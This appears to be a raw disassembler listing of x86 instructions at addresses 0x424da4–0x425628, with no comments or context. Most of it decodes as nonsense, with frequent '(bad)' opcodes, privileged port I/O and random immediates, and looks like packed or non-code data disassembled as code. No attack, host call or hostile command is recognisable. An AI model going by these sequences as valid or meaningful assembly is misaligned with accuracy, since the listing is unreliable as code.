  424da4:	xor    BYTE PTR [edi-0x76],0x53
  424da8:	push   ecx
  424da9:	in     eax,dx
  424daa:	xor    cl,BYTE PTR ds:0xb22984b2
  424db0:	mov    esi,0x80fdff0c
  424db5:	ja     0x424d3d
  424db7:	arpl   WORD PTR [edx+0x775097d5],si
  424dbd:	jbe    0x424d83
  424dbf:	or     DWORD PTR [eax+0x76f0808d],eax
  424dc5:	push   eax
  424dc6:	ja     0x424d4e
  424dc8:	xor    BYTE PTR [edi-0x7a],0x63
  424dcc:	mov    dl,0xd5
  424dce:	iret   
  424dcf:	or     BYTE PTR [edx],0x1d
  424dd2:	sbb    BYTE PTR [edx],0x26
  424dd5:	cmp    cl,BYTE PTR [ebp-0x28f19c73]
  424ddb:	stc    
  424ddc:	sbb    BYTE PTR [edx],0x26
  424ddf:	cmp    cl,BYTE PTR [ebp+0x1d0a808d]
  424de5:	arpl   WORD PTR [esi],cx
  424de7:	xlat   BYTE PTR ds:[ebx]
  424de8:	cmp    eax,DWORD PTR [eax-0x72c5d1e6]
  424dee:	lea    eax,[eax-0x557fde69]
  424df4:	cmp    eax,0xa500eec
  424df9:	and    eax,0x808b7780
  424dfe:	lock mov edx,DWORD PTR [ebx-0x4]
  424e02:	in     eax,dx
  424e03:	add    eax,0xc86b20d
  424e08:	mov    dl,0xba
  424e0a:	sub    edi,edi
  424e0c:	mov    dl,0x50
  424e0e:	ja     0x424dbf
  424e10:	adc    BYTE PTR [edi-0x796c64db],0x3
  424e17:	enter  0x4d4d,0x4f
  424e1b:	push   0x9
  424e1d:	movd   DWORD PTR [ebp-0x28b27273],mm1
  424e24:	and    eax,0x86932a80
  424e29:	sub    eax,0x4f4d4dc8
  424e2e:	push   0x9
  424e30:	pcmpeqb mm1,QWORD PTR [ebp+0x77808d8d]
  424e37:	and    eax,0x94802a80
  424e3c:	xchg   BYTE PTR [eax+0x4f4d4dc2],bh
  424e42:	push   0x9
  424e44:	mov    cr1,ebp
  424e47:	lea    ecx,[ebp-0x6e796c65]
  424e4d:	mov    ecx,DWORD PTR [ebp+0x4d]
  424e50:	dec    edi
  424e51:	push   0x9
  424e53:	ucomiss xmm1,DWORD PTR [ebp-0x317f7273]
  424e5a:	cmp    cl,BYTE PTR es:[ebp-0x28e29c73]
  424e61:	sbb    eax,DWORD PTR [eax-0x72c5cd32]
  424e67:	lea    eax,[ecx]
  424e69:	lock test BYTE PTR [esi-0x7f7b28b3],dl
  424e70:	lock and DWORD PTR [ebp-0x62],ecx
  424e74:	xchg   ebp,eax
  424e75:	xchg   ebx,eax
  424e76:	dec    ebp
  424e77:	or     ah,BYTE PTR ds:0x3a82ce80
  424e7d:	lea    ecx,[ebp-0x27f7280]
  424e83:	push   ebx
  424e84:	push   ecx
  424e85:	in     eax,dx
  424e86:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424e8c:	test   BYTE PTR [ecx],ch
  424e8e:	(bad)  
  424e8f:	std    
  424e90:	aad    0x0
  424e92:	jl     0x424f0b
  424e94:	out    dx,eax
  424e95:	mul    BYTE PTR [ebx]
  424e97:	outs   dx,DWORD PTR ds:[esi]
  424e98:	cmp    BYTE PTR [eax-0xf7f1089],al
  424e9e:	out    dx,eax
  424e9f:	xor    BYTE PTR [edi+0x25],0xb2
  424ea3:	mov    esi,0xc405a20c
  424ea8:	hlt    
  424ea9:	lea    ecx,[ebp+0x197d30b9]
  424eaf:	sub    BYTE PTR [ebp+0x3d],0x80
  424eb3:	lock sub eax,0x925074ec
  424eb9:	adc    eax,0x7c2d7780
  424ebe:	(bad)  
  424ebf:	in     al,dx
  424ec0:	lea    ecx,[ebp+0x2d77808d]
  424ec6:	push   eax
  424ec7:	popf   
  424ec8:	out    dx,al
  424ec9:	xor    BYTE PTR [edi+0x71],0x80
  424ecd:	lock sub eax,0x80ef9250
  424ed3:	ja     0x424eea
  424ed5:	xor    al,0x2d
  424ed8:	push   eax
  424ed9:	xchg   edx,eax
  424eda:	and    esp,eax
  424edc:	adc    eax,0x80257780
  424ee1:	ins    DWORD PTR es:[edi],dx
  424ee2:	cmp    eax,0xec2df080
  424ee7:	je     0x424f39
  424ee9:	xchg   edx,eax
  424eea:	adc    eax,0xed2d7780
  424eef:	sub    eax,0xf7777c8d
  424ef4:	cmp    cl,BYTE PTR [ebp-0x18127273]
  424efa:	test   DWORD PTR [ebp-0x5bacf329],0xc4a37480
  424f04:	or     al,0x53
  424f06:	push   0xffffffab
  424f08:	test   eax,0x8d25fb70
  424f0d:	xchg   edi,eax
  424f0e:	add    BYTE PTR [edi+0x5c099696],0x92
  424f15:	adc    eax,0x1def7501
  424f1a:	or     DWORD PTR [edi+edi*2+0x6f],ebx
  424f1e:	xchg   ebx,eax
  424f1f:	fwait
  424f20:	jl     0x424f99
  424f22:	mov    dh,dh
  424f24:	and    al,0x6f
  424f26:	cmp    BYTE PTR [eax-0x10],dl
  424f29:	mov    ecx,DWORD PTR [edi+0x70]
  424f2c:	aad    0xb5
  424f2e:	icebp  
  424f2f:	and    ah,BYTE PTR [edi+ebp*2]
  424f32:	cmp    BYTE PTR [eax-0x187fde83],al
  424f38:	out    dx,eax
  424f39:	in     al,dx
  424f3a:	retf   
  424f3b:	pop    edi
  424f3c:	out    0x21,eax
  424f3e:	in     al,0xcf
  424f40:	sbb    ch,0xef
  424f43:	in     al,dx
  424f44:	retf   
  424f45:	in     al,dx
  424f46:	out    0xef,eax
  424f48:	pop    edi
  424f49:	out    0x21,eax
  424f4b:	in     al,0x7b
  424f4d:	xor    al,0x8a
  424f50:	and    bh,0x8a
  424f53:	push   ebx
  424f54:	(bad)  
  424f55:	in     eax,dx
  424f56:	dec    ebx
  424f57:	or     eax,0x8029bcb2
  424f5c:	mov    al,ds:0xff0cc4b2
  424f61:	push   es
  424f62:	in     eax,dx
  424f63:	mov    edx,0xeeb2ed8a
  424f68:	in     eax,dx
  424f69:	push   0x3d
  424f6b:	jnp    0x424f1f
  424f6d:	popa   
  424f6e:	sub    edi,edi
  424f70:	retf   
  424f71:	mov    ds:0x6f24f64b,al
  424f76:	cmp    BYTE PTR [edx],bh
  424f78:	out    0x8a,eax
  424f7a:	xor    al,0x8a
  424f7d:	and    bh,0x8a
  424f80:	push   ebx
  424f81:	(bad)  
  424f82:	in     eax,dx
  424f83:	dec    ebx
  424f84:	or     eax,0xb20cbeb2
  424f89:	mov    esp,0x632aff29
  424f8e:	lock mov esp,esp
  424f91:	dec    edx
  424f92:	push   ebx
  424f93:	push   0xffffffab
  424f95:	mov    ds:0x8deffb70,eax
  424f9a:	xchg   edi,eax
  424f9b:	add    BYTE PTR [edi+0x7c8187ed],0x77
  424fa2:	cmp    DWORD PTR [ebx+0x7c8d8dad],0x77
  424fa9:	stc    
  424faa:	in     al,dx
  424fab:	ror    DWORD PTR [ebp-0x7b888373],0x14
  424fb2:	ror    BYTE PTR [ebp-0x74888373],cl
  424fb8:	call   0x8a77:0x7c8dee71
  424fbf:	stc    
  424fc0:	lods   eax,DWORD PTR ds:[esi]
  424fc1:	lea    ecx,[ebp-0x5088884]
  424fc7:	dec    DWORD PTR [ebp+0x7a777c8d]
  424fcd:	dec    ebx
  424fce:	aam    0x8d
  424fd0:	lea    edi,[edi+esi*2-0x7e]
  424fd4:	in     al,dx
  424fd5:	lea    ecx,[ebp-0x79888373]
  424fdb:	mov    dl,0xb9
  424fdd:	lea    ecx,[ebp-0x7f788884]
  424fe3:	xchg   esi,eax
  424fe4:	lea    ecx,[ebp+0x332777c]
  424fea:	mov    bh,0x8d
  424fec:	lea    eax,[eax-0x73a17510]
  424ff2:	fimul  DWORD PTR [ebp-0x7f4dbc73]
  424ff8:	lock mov edx,DWORD PTR [ebx+0x72]
  424ffc:	dec    ebx
  424ffd:	add    eax,0xfd809b99
  425002:	mov    ds:0x8d90f1ba,al
  425007:	lea    esp,[edx-0x7238d090]
  42500d:	lea    esp,[edx-0x725a2bfb]
  425013:	lea    esp,[edx-0x72c2204e]
  425019:	lea    edi,[edi+esi*2-0x38]
  42501d:	div    eax
  42501f:	lea    ecx,[ebp-0x24758884]
  425025:	aad    0x8d
  425027:	lea    edi,[edi+esi*2-0x75]
  42502b:	sbb    DWORD PTR [ecx-0x73],esi
  42502e:	lea    eax,[eax-0x687f7489]
  425034:	mov    dh,BYTE PTR [edi]
  425036:	dec    ecx
  425037:	popf   
  425038:	lea    ecx,[ebp+0x77ecfb53]
  42503e:	enter  0xb680,0x57
  425042:	jnp    0x425051
  425044:	lea    ecx,[ebp-0x68af08bd]
  42504a:	mov    al,BYTE PTR [eax+0x77ec8a77]
  425050:	out    dx,eax
  425051:	adc    BYTE PTR [edi+0x2197ec8a],0x8f
  425058:	nop
  425059:	adc    BYTE PTR [ecx-0x80],dh
  42505c:	ja     0x425090
  42505e:	adc    BYTE PTR [edi-0x76e6c879],0x8d
  425065:	lea    edx,[ebx-0x5]
  425068:	adc    BYTE PTR [edi-0xe04007a],0x3
  42506f:	(bad)  [ebp-0x7f08bc73]
  425075:	ja     0x425070
  425077:	in     al,dx
  425078:	(bad)  
  425079:	icebp  
  42507a:	test   al,0x55
  42507c:	lea    ecx,[ebp-0x681308bd]
  425082:	test   BYTE PTR [eax-0x287f7c89],al
  425088:	jno    0x42500a
  42508a:	out    0x82,eax
  42508c:	mov    ds:0x8d9630c2,al
  425091:	lea    esi,[ebx]
  425093:	test   DWORD PTR [eax-0x3d5d8589],0x8d8d2db7
  42509d:	inc    ebx
  42509e:	ret    0x7253
  4250a1:	dec    ebx
  4250a2:	dec    ebx
  4250a3:	adc    BYTE PTR [edi+0x1fe757f7],0x8d
  4250aa:	lea    esi,[ebx]
  4250ac:	sti    
  4250ad:	xor    BYTE PTR [esi+0x7a2f743],0x4c
  4250b4:	fmul   DWORD PTR [ebp+0x97e638d]
  4250ba:	dec    esp
  4250bb:	mov    ds:0xab4d4d4d,eax
  4250c0:	test   eax,0x8d21fb70
  4250c5:	xchg   edi,eax
  4250c6:	add    BYTE PTR [edi-0x6c8a7813],0x99
  4250cd:	fwait
  4250ce:	jl     0x425147
  4250d0:	xchg   DWORD PTR [ebx+eiz*2+0x777c8d8d],ebx
  4250d7:	xor    dl,al
  4250d9:	jg     0x425068
  4250db:	lea    edi,[edi+esi*2-0x38]
  4250df:	pusha  
  4250e0:	xchg   esi,eax
  4250e1:	lea    ecx,[ebp-0x15748884]
  4250e7:	xchg   esi,eax
  4250e8:	lea    ecx,[ebp-0xd758884]
  4250ee:	sub    eax,0x777c8d8d
  4250f3:	sbb    ecx,0x59
  4250f6:	lea    ecx,[ebp+0x7784777c]
  4250fc:	out    dx,al
  4250fd:	lea    ecx,[ebp+0x6df9777c]
  425103:	xor    DWORD PTR [ebp-0x79888373],ecx
  425109:	sbb    ebx,DWORD PTR [edi-0x73]
  42510c:	lea    edi,[edi+esi*2+0x66]
  425110:	pop    esp
  425111:	leave  
  425112:	lea    ecx,[ebp-0x59958884]
  425118:	lea    ecx,[ebp+0x76777c8d]
  42511e:	iret   
  42511f:	cmp    DWORD PTR [ebp-0x2888373],ecx
  425125:	and    BYTE PTR [ecx],ch
  425127:	lea    ecx,[ebp+0x5caf777c]
  42512d:	iret   
  42512e:	lea    ecx,[ebp-0x1a088884]
  425134:	sbb    eax,0x77808d8d
  425139:	test   BYTE PTR [eax-0x55307c10],al
  42513f:	xor    ecx,DWORD PTR [ebp-0x58c1b873]
  425145:	lea    ecx,[ebp-0x72dcdf31]
  42514b:	lea    ecx,[ecx]
  42514d:	and    dh,BYTE PTR [edx+0x7f549e60]
  425153:	mov    eax,DWORD PTR [ebx-0x3]
  425156:	xor    BYTE PTR [edi-0x76],0x80
  42515a:	xchg   edi,eax
  42515b:	mov    esi,DWORD PTR [ebx]
  42515d:	sti    
  42515e:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425165:	lea    eax,[ebx-0x5]
  425168:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42516f:	xchg   edi,edi
  425171:	sti    
  425172:	push   ebx
  425173:	jb     0x42516f
  425175:	pushf  
  425176:	ins    BYTE PTR es:[edi],dx
  425177:	dec    ebp
  425178:	dec    ebp
  425179:	dec    ebx
  42517a:	or     eax,DWORD PTR [eax-0x2f93de69]
  425180:	pop    ds
  425181:	lea    ecx,[ebp+0x7780f743]
  425187:	xchg   BYTE PTR [eax+0x7c43f9d7],al
  42518d:	or     DWORD PTR [edx],esp
  42518f:	cld    
  425190:	cli    
  425191:	mov    al,ds:0xbe309e50
  425196:	icebp  
  425197:	lea    ecx,[ebp+0x7a777c8d]
  42519d:	sbb    al,0x55
  42519f:	lea    ecx,[ebp+0x2e82777c]
  4251a5:	leave  
  4251a6:	lea    ecx,[ebp-0x327b8884]
  4251ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251ad:	lea    ecx,[ebp+0x3a83777c]
  4251b3:	lea    ecx,[ebp-0x7c587f73]
  4251b9:	push   ebx
  4251ba:	jb     0x42521a
  4251bc:	fwait
  4251bd:	leave  
  4251be:	lea    ecx,[ebp-0x687f39b5]
  4251c4:	test   BYTE PTR [eax-0x4001059],al
  4251ca:	adc    BYTE PTR [edi-0x7f04bc7e],0x97
  4251d1:	jp     0x42520a
  4251d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251d4:	or     DWORD PTR [ebp-0x4ddf673],0x59ef0f01
  4251de:	sub    eax,0x77508ade
  4251e3:	jp     0x425165
  4251e5:	ja     0x4251de
  4251e7:	adc    BYTE PTR [edi+0xbc835af],0x7
  4251ee:	adc    BYTE PTR [edi+0x4523357a],0x2f
  4251f5:	and    DWORD PTR [esi+ebp*8-0x4f11efb9],edx
  4251fc:	xor    BYTE PTR [edi-0x3],0xcf
  425200:	mov    es,edi
  425202:	lea    ecx,[ebp-0x7f898814]
  425208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425209:	push   0x53
  42520b:	jb     0x425258
  42520d:	mov    BYTE PTR [eax-0x639b9969],0x6c
  425214:	dec    ebp
  425215:	dec    ebp
  425216:	aaa    
  425217:	cmp    BYTE PTR [edi-0x73],dl
  42521a:	lea    eax,[ebx-0x5]
  42521d:	push   edi
  42521e:	adc    DWORD PTR [edx+0x4d],ebp
  425221:	dec    ebp
  425222:	in     al,dx
  425223:	std    
  425224:	xor    BYTE PTR [edi-0x76],0x80
  425228:	xchg   edi,eax
  425229:	mov    esi,DWORD PTR [ebx]
  42522b:	sti    
  42522c:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425233:	lea    eax,[ebx-0x5]
  425236:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42523d:	xchg   edi,edi
  42523f:	sti    
  425240:	push   ebx
  425241:	jb     0x42528e
  425243:	mov    BYTE PTR [eax-0x8bcde69],0x80
  42524a:	ja     0x4251d2
  42524c:	and    BYTE PTR [edi+0x97c43f9],0x22
  425253:	je     0x4251d5
  425255:	mov    al,ds:0x4ec8243
  42525a:	arpl   WORD PTR [ebx],ax
  42525c:	or     DWORD PTR [ebp+ebx*2+0x4d],ecx
  425260:	dec    ebp
  425261:	dec    ebp
  425262:	stos   DWORD PTR es:[edi],eax
  425263:	test   eax,0xeffb70a3
  425268:	lea    edx,[edi-0x78127880]
  42526e:	or     bh,BYTE PTR [edi+esi*2+0x62]
  425272:	in     al,0x58
  425274:	fist   WORD PTR [ecx]
  425276:	pop    esi
  425277:	xchg   BYTE PTR [edi+0x77502643],cl
  42527d:	push   esi
  42527e:	jl     0x4252f7
  425280:	pop    esi
  425281:	loop   0x4252db
  425283:	fist   WORD PTR [ecx]
  425285:	push   eax
  425286:	ja     0x4252ee
  425288:	jl     0x425301
  42528a:	push   0xffffffe6
  42528c:	pop    eax
  42528d:	fist   WORD PTR [ecx]
  42528f:	push   eax
  425290:	ja     0x425308
  425292:	xchg   ebx,eax
  425293:	jl     0x42530c
  425295:	std    
  425296:	rcr    BYTE PTR [eax-0x21],1
  425299:	adc    DWORD PTR [eax+0x77],edx
  42529c:	scas   eax,DWORD PTR es:[edi]
  42529d:	cdq    
  42529e:	fwait
  42529f:	jl     0x425318
  4252a1:	neg    DWORD PTR [ecx+0x5011df58]
  4252a7:	ja     0x425323
  4252a9:	push   ebx
  4252aa:	jb     0x4252ff
  4252ac:	dec    ebp
  4252ad:	pusha  
  4252ae:	mul    BYTE PTR [edi+ebp*2]
  4252b1:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  4252b5:	call   0x7b543212
  4252ba:	push   eax
  4252bb:	ja     0x425240
  4252bd:	xor    BYTE PTR [edx+0x50879750],0xe7
  4252c4:	stc    
  4252c5:	add    DWORD PTR [esi+0xd32ed3a],ebx
  4252cb:	mov    dl,0x84
  4252cd:	sub    edi,edi
  4252cf:	sti    
  4252d0:	add    DWORD PTR [ebp+0x78],esi
  4252d3:	bound  eax,QWORD PTR [eax-0x11627f8f]
  4252d9:	or     DWORD PTR [esi+0x3],eax
  4252dc:	or     al,0xb2
  4252de:	les    ecx,FWORD PTR [eax+eax*4]
  4252e1:	sbb    eax,0x53ee6d80
  4252e6:	push   0xffffffa2
  4252e8:	ret    0xc7a7
  4252eb:	add    al,0xd4
  4252ed:	push   edi
  4252ef:	push   eax
  4252f0:	xchg   edi,eax
  4252f1:	mov    eax,DWORD PTR [eax+0x6aec8b77]
  4252f7:	mov    dl,0xb4
  4252f9:	sub    DWORD PTR [ebx+0x77],esp
  4252fc:	and    DWORD PTR [ecx],ecx
  4252fe:	into   
  4252ff:	lea    ecx,fs:[ebp-0x74887f73]
  425306:	in     eax,dx
  425307:	mov    bh,0x86
  425309:	lea    edx,[eax-0x19]
  42530c:	xor    al,BYTE PTR [eax+0x6a4f8b77]
  425312:	aad    0xb7
  425314:	push   ebx
  425315:	push   0x50
  425317:	out    0xc8,eax
  425319:	adc    BYTE PTR [edi-0x10587f7a],0x1
  425320:	gs jno 0x4252a3
  425323:	xchg   edi,eax
  425324:	out    dx,eax
  425325:	in     al,dx
  425326:	pushf  
  425327:	push   eax
  425328:	xchg   edi,eax
  425329:	test   BYTE PTR [edi+0x4d971090],cl
  42532f:	adc    BYTE PTR [edi-0x70631375],0x15
  425336:	mov    al,0x80
  425338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425339:	test   BYTE PTR [eax],dl
  42533b:	adc    ecx,DWORD PTR [edi-0x587fb269]
  425341:	mov    ebp,esp
  425343:	lods   al,BYTE PTR ds:[esi]
  425344:	and    bh,0xef
  425347:	adc    BYTE PTR ds:0xc8978063,dl
  42534d:	ins    DWORD PTR es:[edi],dx
  42534e:	in     eax,dx
  42534f:	clc    
  425350:	mov    dh,BYTE PTR [edx-0x412d67a]
  425356:	out    dx,al
  425357:	(bad)  
  425358:	sti    
  425359:	push   ebx
  42535a:	mov    dl,0x50
  42535c:	ja     0x425326
  42535e:	outs   dx,BYTE PTR ds:[esi]
  42535f:	xlat   BYTE PTR ds:[ebx]
  425360:	enter  0x9780,0xc8
  425364:	in     eax,dx
  425365:	xor    cl,BYTE PTR ds:0xb20c07b2
  42536b:	test   BYTE PTR [ecx],ch
  42536d:	(bad)  
  42536e:	sti    
  42536f:	adc    BYTE PTR [edi-0x1b049c75],0x34
  425376:	push   ebx
  425377:	dec    ebp
  425378:	jnp    0x4252fa
  42537a:	ja     0x4253ae
  42537c:	adc    BYTE PTR [edi-0x79587f75],0xed
  425383:	test   BYTE PTR [edx-0x7f0811ff],cl
  425389:	xchg   edi,eax
  42538a:	mov    eax,DWORD PTR [ecx]
  42538c:	adc    eax,0x21a78093
  425391:	mov    dl,0x7
  425393:	sub    edi,edi
  425395:	sti    
  425396:	push   ebx
  425397:	mov    dl,0x50
  425399:	ja     0x4253cd
  42539b:	outs   dx,BYTE PTR ds:[esi]
  42539c:	xlat   BYTE PTR ds:[ebx]
  42539d:	xor    al,BYTE PTR [eax+0x32ed3297]
  4253a3:	or     eax,0xb20c07b2
  4253a8:	test   BYTE PTR [ecx],ch
  4253aa:	(bad)  
  4253ab:	sti    
  4253ac:	adc    BYTE PTR [edi+0x4372ec8b],0x3
  4253b3:	push   eax
  4253b4:	ja     0x42533c
  4253b6:	arpl   WORD PTR [ecx+ecx*1+0x4c],si
  4253ba:	leave  
  4253bb:	dec    ebp
  4253bc:	dec    ebp
  4253bd:	dec    ebp
  4253be:	xor    BYTE PTR [edi-0x79],0x80
  4253c2:	xchg   edi,eax
  4253c3:	stc    
  4253c4:	in     eax,dx
  4253c5:	clc    
  4253c6:	mov    ch,BYTE PTR [ebp-0x13]
  4253c9:	sti    
  4253ca:	out    dx,al
  4253cb:	mov    dl,0x86
  4253cd:	sub    edi,edi
  4253cf:	sti    
  4253d0:	push   ebx
  4253d1:	mov    dl,0x80
  4253d3:	add    BYTE PTR [eax-0x1281ac09],0xc6
  4253da:	or     eax,0x5029b4b2
  4253df:	xchg   edi,eax
  4253e0:	stc    
  4253e1:	mov    dl,0x7
  4253e3:	or     al,0x50
  4253e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253e6:	xchg   DWORD PTR [eax],esi
  4253e8:	xchg   edi,eax
  4253e9:	xchg   ebp,ebp
  4253eb:	out    0x87,eax
  4253ed:	outs   dx,DWORD PTR ds:[esi]
  4253ee:	or     edx,ebp
  4253f0:	jp     0x4253ff
  4253f2:	dec    ebp
  4253f3:	dec    ebp
  4253f4:	stos   DWORD PTR es:[edi],eax
  4253f5:	test   eax,0xeffb70a3
  4253fa:	lea    edx,[edi-0x78127880]
  425400:	adc    eax,0x7cef7780
  425405:	ja     0x425439
  425407:	mul    BYTE PTR [edi+ebp*2]
  42540a:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  42540e:	cmc    
  42540f:	and    al,0x6f
  425411:	cmp    BYTE PTR [eax+0x5099938d],al
  425417:	ja     0x4253a4
  425419:	jl     0x425492
  42541b:	enter  0x24dc,0x6f
  42541f:	cmp    BYTE PTR [ebx+0x4787777c],bl
  425425:	sbb    al,0xf9
  425427:	adc    eax,DWORD PTR [eax-0xf7f7529]
  42542d:	mov    ah,dl
  42542f:	or     eax,0x6f24225e
  425434:	cmp    BYTE PTR [ebx-0x454dd5ad],ch
  42543a:	sub    DWORD PTR [ebx+0x32],edx
  42543d:	mov    dl,0x88
  42543f:	or     al,0xff
  425441:	add    eax,0x8032f080
  425446:	xchg   edi,eax
  425447:	xor    dl,BYTE PTR [ebx-0x3]
  42544a:	push   ebx
  42544b:	pushf  
  42544c:	mov    dl,0xbe
  42544e:	or     al,0xb2
  425450:	clc    
  425451:	sub    edi,edi
  425453:	dec    BYTE PTR [ecx]
  425455:	and    al,BYTE PTR ds:0x8d8d24be
  42545b:	lea    eax,[eax-0x687f7410]
  425461:	mov    edx,DWORD PTR [ebx-0x64]
  425464:	mov    dl,0xf8
  425466:	sub    DWORD PTR [ebx-0x3],edx
  425469:	mov    dl,0xbe
  42546b:	or     al,0xff
  42546d:	inc    BYTE PTR [eax-0x587f7569]
  425473:	mov    dl,BYTE PTR [ebx-0x9]
  425476:	push   ebx
  425477:	lods   al,BYTE PTR ds:[esi]
  425478:	mov    dl,0x7
  42547a:	or     al,0xb2
  42547c:	mov    ah,0x29
  42547e:	call   DWORD PTR [edi+ecx*2-0x74687f02]
  425485:	xor    al,0x8b
  425488:	aad    0x59
  42548a:	push   ebx
  42548b:	sub    dh,BYTE PTR [edx-0x8acd646]
  425491:	mov    dl,0x7
  425493:	or     al,0xff
  425495:	mov    dh,0x80
  425497:	lock mov al,BYTE PTR [eax-0x2ac7559]
  42549e:	push   ebx
  42549f:	lods   al,BYTE PTR ds:[esi]
  4254a0:	mov    dl,0xbe
  4254a2:	or     al,0xb2
  4254a4:	mov    ah,0x29
  4254a6:	call   DWORD PTR [ecx]
  4254a8:	xchg   esp,eax
  4254a9:	pop    es
  4254aa:	xor    al,0x87
  4254ad:	and    BYTE PTR [edi+0x53fd5387],0xac
  4254b4:	mov    dl,0xbe
  4254b6:	or     al,0xb2
  4254b8:	mov    ah,0x29
  4254ba:	call   DWORD PTR [ecx]
  4254bc:	push   ebx
  4254bd:	mov    dh,0xc4
  4254bf:	sub    eax,0xbab22a53
  4254c4:	sub    DWORD PTR [ebx-0x9],edx
  4254c7:	mov    dl,0x7
  4254c9:	or     al,0xff
  4254cb:	mov    dh,0x80
  4254cd:	lock mov al,BYTE PTR [eax-0x2ac7559]
  4254d4:	push   ebx
  4254d5:	lods   al,BYTE PTR ds:[esi]
  4254d6:	mov    dl,0xbe
  4254d8:	or     al,0xb2
  4254da:	mov    ah,0x29
  4254dc:	call   DWORD PTR [ecx]
  4254de:	xchg   esp,eax
  4254df:	pop    es
  4254e0:	push   eax
  4254e1:	xchg   edi,eax
  4254e2:	mov    eax,DWORD PTR [eax-0x687f7510]
  4254e8:	mov    dl,BYTE PTR [ebx-0x3]
  4254eb:	push   ebx
  4254ec:	pushf  
  4254ed:	mov    dl,0xbe
  4254ef:	or     al,0xb2
  4254f1:	clc    
  4254f2:	sub    edi,edi
  4254f4:	(bad)  
  4254f5:	in     al,dx
  4254f6:	add    eax,0x80c8f080
  4254fb:	xchg   edi,eax
  4254fc:	enter  0x9c53,0x53
  425500:	std    
  425501:	mov    dl,0xf8
  425503:	sub    DWORD PTR [edx-0x100f342],esi
  425509:	adc    BYTE PTR [edi-0x75587f76],0x53
  425510:	not    DWORD PTR [ebx-0x54]
  425513:	mov    dl,0xb4
  425515:	sub    DWORD PTR [edx-0x6b00f3f9],esi
  42551b:	inc    ebx
  42551c:	(bad)  
  42551d:	arpl   WORD PTR ds:0x4d5b4c09,ax
  425523:	dec    ebp
  425524:	dec    ebp
  425525:	xor    BYTE PTR [edi-0x75],0x80
  425529:	lock out dx,eax
  42552b:	stos   DWORD PTR es:[edi],eax
  42552c:	test   eax,0x77803a50
  425531:	mov    esp,DWORD PTR [ebx-0x72110490]
  425537:	xchg   edi,eax
  425538:	add    BYTE PTR [edi+0x70539696],0x5f
  42553f:	lock and ebp,edx
  425542:	in     eax,0x5f
  425544:	lock out dx,eax
  425546:	(bad)  
  425548:	(bad)  
  425549:	out    dx,al
  42554a:	outs   dx,BYTE PTR ds:[esi]
  42554b:	adc    BYTE PTR [edi+0x9],dh
  42554e:	cld    
  42554f:	ja     0x42551d
  425551:	aad    0xfc
  425553:	ja     0x425562
  425555:	sbb    esp,edi
  425557:	ja     0x4255a6
  425559:	ror    BYTE PTR [ecx],1
  42555b:	loopne 0x4255d4
  42555d:	dec    ebp
  42555e:	or     eax,esp
  425560:	xchg   edi,eax
  425561:	or     eax,0x8d8d7acf
  425566:	lea    esi,[ebx]
  425568:	sti    
  425569:	or     eax,esp
  42556b:	xchg   edi,eax
  42556c:	int3   
  42556d:	xor    edi,ebx
  42556f:	adc    BYTE PTR [edi-0x7b],dh
  425572:	cld    
  425573:	ja     0x42557b
  425575:	or     eax,0xd48a77fc
  42557a:	cld    
  42557b:	ja     0x4255ca
  42557d:	jl     0x42557b
  42557f:	ja     0x42558e
  425581:	sar    esp,cl
  425583:	ja     0x425551
  425585:	push   esp
  425586:	(bad)  
  425587:	ja     0x425555
  425589:	(bad)  
  42558a:	xchg   edi,eax
  42558b:	or     eax,0x978ffba6
  425590:	dec    ebp
  425591:	sar    bl,cl
  425593:	(bad)  
  425594:	xchg   edi,eax
  425595:	mov    cl,BYTE PTR [ebx]
  425597:	pop    es
  425598:	(bad)  
  425599:	xchg   edi,eax
  42559a:	push   es
  42559b:	sar    bl,cl
  42559d:	(bad)  
  42559e:	xchg   edi,eax
  42559f:	test   esi,edx
  4255a1:	neg    ebx
  4255a3:	or     DWORD PTR [ecx],ecx
  4255a5:	loopne 0x42561e
  4255a7:	or     DWORD PTR [edi+0x8],eax
  4255aa:	lea    ecx,[ebp+0x977108d]
  4255b0:	div    eax
  4255b2:	or     DWORD PTR [edi-0x11eff689],ecx
  4255b8:	outs   dx,BYTE PTR ds:[esi]
  4255b9:	xchg   edx,eax
  4255ba:	arpl   ax,si
  4255bc:	out    dx,eax
  4255bd:	in     al,0x50
  4255bf:	dec    ebp
  4255c0:	xlat   BYTE PTR ds:[ebx]
  4255c1:	out    dx,eax
  4255c2:	cdq    
  4255c3:	xchg   BYTE PTR [edx-0x76],cl
  4255c6:	dec    ebp
  4255c7:	dec    ebp
  4255c8:	jo     0x4255c5
  4255ca:	out    dx,eax
  4255cb:	lea    edx,[edi-0x785d7880]
  4255d1:	cmp    eax,0x938d8dee
  4255d6:	cdq    
  4255d7:	mul    BYTE PTR fs:[edi+ebp*2]
  4255db:	cmp    BYTE PTR [eax-0x59],dl
  4255de:	xor    bh,BYTE PTR [edi+esi*2-0x76]
  4255e2:	cmc    
  4255e3:	and    al,0x6f
  4255e5:	cmp    BYTE PTR [edi+esi*2-0x79],bh
  4255e9:	imul   BYTE PTR [edi+ebp*2]
  4255ec:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  4255f0:	xchg   esi,eax
  4255f1:	mov    ch,0xcb
  4255f3:	scas   al,BYTE PTR es:[edi]
  4255f4:	xor    BYTE PTR [edi+0x32],0x80
  4255f8:	lock xor bl,BYTE PTR [ebx-0x2cfef21e]
  4255ff:	cmp    ch,BYTE PTR [ebx+0x2a53fc53]
  425605:	mov    dl,0x86
  425607:	or     al,0xb2
  425609:	mov    edx,0x50b2ff29
  42560e:	ja     0x42559b
  425610:	jl     0x425689
  425612:	sbb    esp,0x24
  425615:	outs   dx,DWORD PTR ds:[esi]
  425616:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  42561a:	inc    edi
  42561b:	sbb    al,0xf9
  42561d:	adc    edi,DWORD PTR [edi+esi*2-0x7c]
  425621:	out    dx,eax
  425622:	lea    ecx,[ebp-0x7f8f7f73]
  425628:	ja     0x4255b4
